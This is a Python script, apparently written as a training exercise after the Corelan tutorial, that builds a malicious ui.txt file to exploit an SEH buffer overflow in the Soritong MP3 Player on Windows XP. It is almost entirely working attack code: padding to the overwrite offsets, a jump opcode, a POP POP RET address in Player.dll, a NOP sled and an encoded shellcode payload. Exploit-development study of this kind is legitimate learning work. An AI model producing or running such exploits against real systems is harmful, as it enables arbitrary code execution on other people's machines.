#!/usr/bin/python

# Author: Michael Music
# Date: 2/16/2019
# Description: Soritong MP3 Player Buffer Overflow Exploit
#  Exercise in BOFs following the corelan guide
#  Tested on Windows XP

out = 'ui.txt'

# Need to find a POP POP RET address to place in SEH
# Need to put JMP 8+ bytes opcode in nSEH
# Need to crash the program
# POP POP RET in module Player.dll located at 0x1001af39
# nSEH located at offset 584
# SEH located at offset 588

# Initial junk to crash the program
junk = 'A' * 584

# nSEH, JMPcode will go here
junk += '\xeb\x08\x90\x90' 

# SEH, POP POP RET goes here
junk += '\x39\xaf\x01\x10'

# NOPsled which will be hit by the nSEH JMPcode
junk += '\x90' * 16

# Shellcode
buf =  ""
buf += "\xd9\xee\xd9\x74\x24\xf4\x5d\x55\x59\x49\x49\x49\x49"
buf += "\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x43\x37"
buf += "\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41"
buf += "\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
buf += "\x50\x38\x41\x42\x75\x4a\x49\x79\x6c\x4d\x38\x6b\x32"
buf += "\x43\x30\x35\x50\x33\x30\x55\x30\x6c\x49\x5a\x45\x55"
buf += "\x61\x4b\x70\x35\x34\x4c\x4b\x66\x30\x64\x70\x4e\x6b"
buf += "\x30\x52\x36\x6c\x4e\x6b\x43\x62\x64\x54\x6e\x6b\x61"
buf += "\x62\x51\x38\x74\x4f\x38\x37\x53\x7a\x46\x46\x45\x61"
buf += "\x6b\x4f\x4e\x4c\x67\x4c\x51\x71\x43\x4c\x73\x32\x64"
buf += "\x6c\x55\x70\x6b\x71\x48\x4f\x54\x4d\x55\x51\x59\x57"
buf += "\x78\x62\x4a\x52\x42\x72\x42\x77\x4e\x6b\x51\x42\x66"
buf += "\x70\x4c\x4b\x30\x4a\x57\x4c\x4c\x4b\x70\x4c\x56\x71"
buf += "\x42\x58\x5a\x43\x51\x58\x63\x31\x4a\x71\x32\x71\x4c"
buf += "\x4b\x61\x49\x75\x70\x37\x71\x49\x43\x6e\x6b\x43\x79"
buf += "\x46\x78\x49\x73\x36\x5a\x37\x39\x6c\x4b\x56\x54\x6c"
buf += "\x4b\x35\x51\x48\x56\x76\x51\x49\x6f\x4c\x6c\x49\x51"
buf += "\x5a\x6f\x76\x6d\x35\x51\x78\x47\x65\x68\x6b\x50\x50"
buf += "\x75\x69\x66\x76\x63\x43\x4d\x7a\x58\x77\x4b\x33\x4d"
buf += "\x66\x44\x61\x65\x6a\x44\x71\x48\x4e\x6b\x70\x58\x67"
buf += "\x54\x46\x61\x79\x43\x42\x46\x4c\x4b\x46\x6c\x42\x6b"
buf += "\x6c\x4b\x36\x38\x75\x4c\x33\x31\x78\x53\x6c\x4b\x65"
buf += "\x54\x4e\x6b\x66\x61\x4e\x30\x6e\x69\x67\x34\x31\x34"
buf += "\x35\x74\x53\x6b\x31\x4b\x70\x61\x53\x69\x53\x6a\x36"
buf += "\x31\x6b\x4f\x6b\x50\x71\x4f\x61\x4f\x73\x6a\x4e\x6b"
buf += "\x66\x72\x78\x6b\x4c\x4d\x61\x4d\x32\x4a\x73\x31\x4e"
buf += "\x6d\x4f\x75\x4e\x52\x47\x70\x55\x50\x57\x70\x66\x30"
buf += "\x72\x48\x75\x61\x6e\x6b\x72\x4f\x6b\x37\x69\x6f\x4b"
buf += "\x65\x6f\x4b\x48\x70\x58\x35\x6c\x62\x43\x66\x42\x48"
buf += "\x6f\x56\x4a\x35\x6d\x6d\x4f\x6d\x6b\x4f\x7a\x75\x35"
buf += "\x6c\x44\x46\x31\x6c\x66\x6a\x6b\x30\x49\x6b\x6b\x50"
buf += "\x53\x45\x56\x65\x4d\x6b\x51\x57\x55\x43\x70\x72\x42"
buf += "\x4f\x73\x5a\x67\x70\x42\x73\x59\x6f\x69\x45\x52\x43"
buf += "\x65\x31\x62\x4c\x71\x73\x34\x6e\x35\x35\x71\x68\x52"
buf += "\x45\x43\x30\x41\x41"

junk += buf

# More junk
junk += 'A' * (5000 - len(junk))

text = open(out, 'w')
text.write(junk)
text.close
